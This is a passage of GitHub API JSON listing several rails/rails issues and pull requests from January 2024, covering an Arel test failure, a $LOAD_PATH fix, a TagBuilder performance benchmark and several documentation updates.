            "repos_url": "https://api.github.com/users/koya1616/repos",
            "events_url": "https://api.github.com/users/koya1616/events{/privacy}",
            "received_events_url": "https://api.github.com/users/koya1616/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-13T12:31:34Z",
        "updated_at": "2024-01-20T05:39:15Z",
        "closed_at": "2024-01-20T05:39:06Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50741",
            "html_url": "https://github.com/rails/rails/pull/50741",
            "diff_url": "https://github.com/rails/rails/pull/50741.diff",
            "patch_url": "https://github.com/rails/rails/pull/50741.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because `arel/select_manager_test.rb` is failling test\r\n\r\n### Detail\r\n\r\n```\r\nvscode  /workspaces/rails/activerecord (main) $ bin/test test/cases/arel/select_manager_test.rb\r\n```\r\nI Run the above test.\r\nAt that time, if this `require \"active_model\"` is not in `activerecord/lib/arel.rb`, the following error will occur\r\n```\r\nNameError: uninitialized constant Arel::Nodes::ActiveModel\r\n    lib/arel/nodes/casted.rb:50:in `build_quoted'\r\n    test/cases/arel/select_manager_test.rb:686:in `block (2 levels) in <class:SelectManagerTest>'\r\n```\r\n\r\nMaybe from [this change](https://github.com/rails/rails/pull/41577), the test is failing.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50741/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50741/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50740",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50740/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50740/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50740/events",
        "html_url": "https://github.com/rails/rails/pull/50740",
        "id": 2080267725,
        "node_id": "PR_kwDNIULOZAA87A",
        "number": 50740,
        "title": "Fix $LOAD_PATH to correctly require files",
        "user": {
            "login": "dorianmarie",
            "id": 71096653,
            "node_id": "MDQ6VXNlcjcxMDk2NjUz",
            "avatar_url": "https://avatars.githubusercontent.com/u/71096653?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dorianmarie",
            "html_url": "https://github.com/dorianmarie",
            "followers_url": "https://api.github.com/users/dorianmarie/followers",
            "following_url": "https://api.github.com/users/dorianmarie/following{/other_user}",
            "gists_url": "https://api.github.com/users/dorianmarie/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dorianmarie/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dorianmarie/subscriptions",
            "organizations_url": "https://api.github.com/users/dorianmarie/orgs",
            "repos_url": "https://api.github.com/users/dorianmarie/repos",
            "events_url": "https://api.github.com/users/dorianmarie/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dorianmarie/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-13T12:17:26Z",
        "updated_at": "2024-01-15T19:09:20Z",
        "closed_at": "2024-01-15T18:32:55Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50740",
            "html_url": "https://github.com/rails/rails/pull/50740",
            "diff_url": "https://github.com/rails/rails/pull/50740.diff",
            "patch_url": "https://github.com/rails/rails/pull/50740.patch",
            "merged_at": null
        },
        "body": "Other I would get errors like:\r\n\r\nLoadError: cannot load such file -- rails/api/generator (LoadError)\r\n\r\nWe were loading the installed rails gem and not the current subdirectories\r\n\r\nThis can be reproduced by doing `bundle clean --force` then `rake`\r\n\r\nFixes #50739",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50740/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50740/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50739",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50739/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50739/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50739/events",
        "html_url": "https://github.com/rails/rails/issues/50739",
        "id": 2080216563,
        "node_id": "I_kwDNIULOe_2V8w",
        "number": 50739,
        "title": "rails/rails is dependent on yard, rails and sdoc",
        "user": {
            "login": "dorianmarie",
            "id": 71096653,
            "node_id": "MDQ6VXNlcjcxMDk2NjUz",
            "avatar_url": "https://avatars.githubusercontent.com/u/71096653?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dorianmarie",
            "html_url": "https://github.com/dorianmarie",
            "followers_url": "https://api.github.com/users/dorianmarie/followers",
            "following_url": "https://api.github.com/users/dorianmarie/following{/other_user}",
            "gists_url": "https://api.github.com/users/dorianmarie/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dorianmarie/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dorianmarie/subscriptions",
            "organizations_url": "https://api.github.com/users/dorianmarie/orgs",
            "repos_url": "https://api.github.com/users/dorianmarie/repos",
            "events_url": "https://api.github.com/users/dorianmarie/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dorianmarie/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 8,
        "created_at": "2024-01-13T10:03:33Z",
        "updated_at": "2024-01-15T19:18:46Z",
        "closed_at": "2024-01-15T18:32:30Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n```\r\n~/src> git clone git@github.com:rails/rails.git\r\nCloning into 'rails'...\r\nremote: Enumerating objects: 859917, done.\r\nremote: Counting objects: 100% (586/586), done.\r\nremote: Compressing objects: 100% (334/334), done.\r\nremote: Total 859917 (delta 332), reused 468 (delta 252), pack-reused 859331\r\nReceiving objects: 100% (859917/859917), 262.58 MiB | 6.53 MiB/s, done.\r\nResolving deltas: 100% (642022/642022), done.\r\n~/src> cd rails/\r\n~/s/rails> bundle clean --force\r\nRemoving actioncable (7.1.2)\r\nRemoving actionmailbox (7.1.2)\r\nRemoving actionmailer (7.1.2)\r\nRemoving actionpack (7.1.2)\r\nRemoving actiontext (7.1.2)\r\nRemoving actionview (7.1.2)\r\nRemoving activejob (7.1.2)\r\nRemoving activemodel (7.1.2)\r\nRemoving activerecord (7.1.2)\r\nRemoving activestorage (7.1.2)\r\nRemoving activesupport (7.1.2)\r\nRemoving rails (7.1.2)\r\nRemoving railties (7.1.2)\r\nRemoving sdoc (2.6.1)\r\nRemoving yard (0.9.34)\r\n~/s/rails> bundle\r\nBundle complete! 84 Gemfile dependencies, 221 gems now installed.\r\nUse `bundle info [gemname]` to see where a bundled gem is installed.\r\n~/s/rails> rake\r\nrake aborted!\r\nLoadError: cannot load such file -- rails/api/generator (LoadError)\r\n<internal:/Users/dorianmariefr/.asdf/installs/ruby/3.3.0/lib/ruby/3.3.0/rubygems/core_ext/kernel_require.rb>:127:in `require'\r\n<internal:/Users/dorianmariefr/.asdf/installs/ruby/3.3.0/lib/ruby/3.3.0/rubygems/core_ext/kernel_require.rb>:127:in `require'\r\n/Users/dorianmariefr/src/rails/railties/lib/rails/api/task.rb:4:in `<top (required)>'\r\n<internal:/Users/dorianmariefr/.asdf/installs/ruby/3.3.0/lib/ruby/3.3.0/rubygems/core_ext/kernel_require.rb>:127:in `require'\r\n<internal:/Users/dorianmariefr/.asdf/installs/ruby/3.3.0/lib/ruby/3.3.0/rubygems/core_ext/kernel_require.rb>:127:in `require'\r\n/Users/dorianmariefr/src/rails/Rakefile:7:in `<top (required)>'\r\n(See full trace by running task with --trace)\r\n```\r\n\r\n### Expected behavior\r\n\r\nIt runs the tests\r\n\r\n### Actual behavior\r\n\r\nIt is dependent on yard, rails and sdoc being installed\r\n\r\n### System configuration\r\n**Rails version**: commit 4fb230d2140054f8d0114c2c8dcc659af10a7972 (HEAD -> main, origin/main, origin/HEAD)\r\n\r\nAuthor: Xavier Noria <fxn@hashref.com>\r\n\r\nDate:   Fri Jan 12 23:58:55 2024 +0100\r\n\r\n**Ruby version**: ruby 3.3.0 (2023-12-25 revision 5124f9ac75) +YJIT [arm64-darwin23]",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50739/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50739/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50738",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50738/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50738/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50738/events",
        "html_url": "https://github.com/rails/rails/pull/50738",
        "id": 2079807403,
        "node_id": "PR_kwDNIULOY_of_w",
        "number": 50738,
        "title": "Improve `after_enqueue` example",
        "user": {
            "login": "Mangara",
            "id": 5864726,
            "node_id": "MDQ6VXNlcjU4NjQ3MjY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5864726?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Mangara",
            "html_url": "https://github.com/Mangara",
            "followers_url": "https://api.github.com/users/Mangara/followers",
            "following_url": "https://api.github.com/users/Mangara/following{/other_user}",
            "gists_url": "https://api.github.com/users/Mangara/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Mangara/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Mangara/subscriptions",
            "organizations_url": "https://api.github.com/users/Mangara/orgs",
            "repos_url": "https://api.github.com/users/Mangara/repos",
            "events_url": "https://api.github.com/users/Mangara/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Mangara/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 123812746,
                "node_id": "MDU6TGFiZWwxMjM4MTI3NDY=",
                "url": "https://api.github.com/repos/rails/rails/labels/activejob",
                "name": "activejob",
                "color": "5319e7",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-12T22:20:59Z",
        "updated_at": "2024-01-12T22:25:15Z",
        "closed_at": "2024-01-12T22:25:08Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50738",
            "html_url": "https://github.com/rails/rails/pull/50738",
            "diff_url": "https://github.com/rails/rails/pull/50738.diff",
            "patch_url": "https://github.com/rails/rails/pull/50738.patch",
            "merged_at": "2024-01-12T22:25:08Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because the current example suggests that `after_enqueue` is only called if the enqueue is successful, which is not always true.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the example to highlight the [introspection methods](https://github.com/rails/rails/commit/ee60ce5606cda9e17b76406aea004b9250bf3655) added in Rails 7.0.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [X] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [X] Tests are added or updated if you fix a bug or add a feature.\r\n* [X] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50738/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50738/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50737",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50737/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50737/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50737/events",
        "html_url": "https://github.com/rails/rails/pull/50737",
        "id": 2079736223,
        "node_id": "PR_kwDNIULOY_k63Q",
        "number": 50737,
        "title": "Optimize TagBuilder tag generation",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-12T21:17:07Z",
        "updated_at": "2024-01-18T23:53:07Z",
        "closed_at": "2024-01-18T18:19:27Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50737",
            "html_url": "https://github.com/rails/rails/pull/50737",
            "diff_url": "https://github.com/rails/rails/pull/50737.diff",
            "patch_url": "https://github.com/rails/rails/pull/50737.patch",
            "merged_at": "2024-01-18T18:19:27Z"
        },
        "body": "Currently there's about a 35% difference between tags generated using the `TagBuilder` and tags generated by passing a positional argument to `#tag`.\r\n\r\nThis commit optimizes `TagBuilder` to reduce that difference down to 13%.\r\n\r\nThe first change is to perform less hash allocations by not splatting the options twice in the `TagBuilder` (one at the `tag.a` invocation, and one at `tag_string`). The extra splat for `tag_string` was moved into `method_missing` since that is the only other caller of this private method.\r\n\r\nThe other change is to only escape the content in `tag_string` if it a non-empty.\r\n\r\nBenchmark:\r\n\r\n```\r\nrequire \"action_view\"\r\nrequire \"benchmark/ips\"\r\n\r\nclass Foo\r\n  include ActionView::Helpers\r\nend\r\n\r\nhelpers = Foo.new\r\n\r\nBenchmark.ips do |x|\r\n  x.report(\"tag\") { helpers.tag(\"a\", href: \"foo\") }\r\n  x.report(\"tag_builder\") { helpers.tag.a(href: \"foo\") }\r\n  x.compare!\r\nend\r\n```\r\n\r\nBefore:\r\n\r\n```\r\nruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]\r\nWarming up --------------------------------------\r\n                 tag    67.180k i/100ms\r\n         tag_builder    50.267k i/100ms\r\nCalculating -------------------------------------\r\n                 tag    673.064k ( 0.4%) i/s -      3.426M in   5.090520s\r\n         tag_builder    504.971k ( 0.4%) i/s -      2.564M in   5.076842s\r\n\r\nComparison:\r\n                 tag:   673063.7 i/s\r\n         tag_builder:   504971.4 i/s - 1.33x  slower\r\n```\r\n\r\nAfter:\r\n\r\n```\r\nruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]\r\nWarming up --------------------------------------\r\n                 tag    67.374k i/100ms\r\n         tag_builder    59.702k i/100ms\r\nCalculating -------------------------------------\r\n                 tag    670.837k ( 0.4%) i/s -      3.369M in   5.021714s\r\n         tag_builder    592.727k ( 1.3%) i/s -      2.985M in   5.037088s\r\n\r\nComparison:\r\n                 tag:   670836.6 i/s\r\n         tag_builder:   592726.7 i/s - 1.13x  slower\r\n```",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50737/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 1,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50737/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50736",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50736/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50736/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50736/events",
        "html_url": "https://github.com/rails/rails/pull/50736",
        "id": 2079603535,
        "node_id": "PR_kwDNIULOY_djFg",
        "number": 50736,
        "title": "Add examples to #slice and #values_at documentation [ci-skip] (#50679)",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            },
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-12T19:53:51Z",
        "updated_at": "2024-01-12T19:54:01Z",
        "closed_at": "2024-01-12T19:53:58Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50736",
            "html_url": "https://github.com/rails/rails/pull/50736",
            "diff_url": "https://github.com/rails/rails/pull/50736.diff",
            "patch_url": "https://github.com/rails/rails/pull/50736.patch",
            "merged_at": "2024-01-12T19:53:58Z"
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50736/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50736/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50735",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50735/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50735/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50735/events",
        "html_url": "https://github.com/rails/rails/pull/50735",
        "id": 2079497342,
        "node_id": "PR_kwDNIULOY_XkIQ",
        "number": 50735,
        "title": "Update deprecation.rails guides [ci skip]",
        "user": {
            "login": "keegnotrub",
            "id": 1398,
            "node_id": "MDQ6VXNlcjEzOTg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1398?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/keegnotrub",
            "html_url": "https://github.com/keegnotrub",
            "followers_url": "https://api.github.com/users/keegnotrub/followers",
            "following_url": "https://api.github.com/users/keegnotrub/following{/other_user}",
            "gists_url": "https://api.github.com/users/keegnotrub/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/keegnotrub/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/keegnotrub/subscriptions",
            "organizations_url": "https://api.github.com/users/keegnotrub/orgs",
            "repos_url": "https://api.github.com/users/keegnotrub/repos",
            "events_url": "https://api.github.com/users/keegnotrub/events{/privacy}",
            "received_events_url": "https://api.github.com/users/keegnotrub/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-12T18:55:31Z",
        "updated_at": "2024-01-12T22:06:30Z",
        "closed_at": "2024-01-12T20:29:44Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50735",
            "html_url": "https://github.com/rails/rails/pull/50735",
            "diff_url": "https://github.com/rails/rails/pull/50735.diff",
            "patch_url": "https://github.com/rails/rails/pull/50735.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\n\r\nBoth `:gem_name` and `:deprecation_horizon` were added to the `deprecation.rails` event some time ago in Rails 5.2.0. See Changelog entry \"Pass gem name and deprecation horizon to deprecation notifications.\".\r\n\r\nhttps://github.com/rails/rails/blob/5-2-stable/activesupport/CHANGELOG.md#rails-520-april-09-2018\r\n\r\n\r\n### Detail\r\n\r\nThis was added to be documented in the Rails Guides roughly a year ago, however, it was not back ported to previous Rails Guides versions (such as 6.1 here).\r\n\r\nhttps://github.com/rails/rails/pull/47305/files\r\n\r\n\r\n### Additional information\r\n\r\nWe ran into this while upgrading an existing Rails 6.1.x application. We are unsure if a PR against the `6-1-stable` branch is the way to properly update the Rails 6.1 Edge Guides, so please advise if not.  Also, please let us know if the Rails 6.0 and Rails 5.2 Guides should also have this back ported.\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\nCo-authored-by: Stefanni Brasil <stefannibrasil@gmail.com>",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50735/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50735/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50734",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50734/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50734/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50734/events",
        "html_url": "https://github.com/rails/rails/pull/50734",
        "id": 2079487889,
        "node_id": "PR_kwDNIULOY_XCHQ",
        "number": 50734,
        "title": "docs: Adjust composite primary keys documentation [skip ci]",
        "user": {
            "login": "matsales28",
            "id": 54689845,
            "node_id": "MDQ6VXNlcjU0Njg5ODQ1",
            "avatar_url": "https://avatars.githubusercontent.com/u/54689845?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/matsales28",
            "html_url": "https://github.com/matsales28",
            "followers_url": "https://api.github.com/users/matsales28/followers",
            "following_url": "https://api.github.com/users/matsales28/following{/other_user}",
            "gists_url": "https://api.github.com/users/matsales28/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/matsales28/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/matsales28/subscriptions",
            "organizations_url": "https://api.github.com/users/matsales28/orgs",
            "repos_url": "https://api.github.com/users/matsales28/repos",
            "events_url": "https://api.github.com/users/matsales28/events{/privacy}",
            "received_events_url": "https://api.github.com/users/matsales28/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-12T18:49:57Z",
        "updated_at": "2024-01-17T18:36:00Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50734",
            "html_url": "https://github.com/rails/rails/pull/50734",
            "diff_url": "https://github.com/rails/rails/pull/50734.diff",
            "patch_url": "https://github.com/rails/rails/pull/50734.patch",
            "merged_at": null
        },
